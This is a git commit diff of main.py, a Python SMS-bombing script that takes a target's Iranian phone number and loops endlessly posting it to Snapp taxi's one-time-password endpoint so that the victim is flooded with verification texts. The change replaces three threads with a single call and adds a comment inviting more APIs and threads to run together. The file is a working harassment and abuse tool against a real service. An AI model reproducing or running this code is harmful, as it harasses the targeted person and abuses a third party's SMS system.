c2619fd600a24af8eb35a9d3955554b2d7e4bf12
F0X1EN <71270502+F0X1EN@users.noreply.github.com>
2021-01-20 23:13:33 +0330

    Update main.py

--- main.py
+++ main.py
@@ -2,24 +2,17 @@ import requests
 import time as t
 import threading as th
 
-_phNumber = input("enter the target's phone number with out \"0\" or \"+98\"\nsample phone number: 9123456789: ")
+_phNumber = input("enter the target's phone number with out \"0\" or \"+98\": ")
 
 def send_sms(iurl, ipayload):
     while True:
         r = requests.post(iurl, json=ipayload)
-        t.sleep(1)
         if r.status_code == 200:
             print("SUCCEED")
         else:
             print("ERROR " + str(r.status_code))
+        t.sleep(1)
 
-# Snapp Threads
-# init the Threads
-ts0 = th.Thread(target=send_sms, args=('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', {"cellphone": "+98" + _phNumber}))
-ts1 = th.Thread(target=send_sms, args=('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', {"cellphone": "+98" + _phNumber}))
-ts2 = th.Thread(target=send_sms, args=('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', {"cellphone": "+98" + _phNumber}))
-# start the Threads
-ts0.start()
-ts1.start()
-ts2.start()
-# End of Snapp Threads
+send_sms('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', {"cellphone": "+98" + _phNumber})
+
+# this is just using one thread and one API, if u had more APIs u can add them and use them with threading module so it does all the work at the same time.
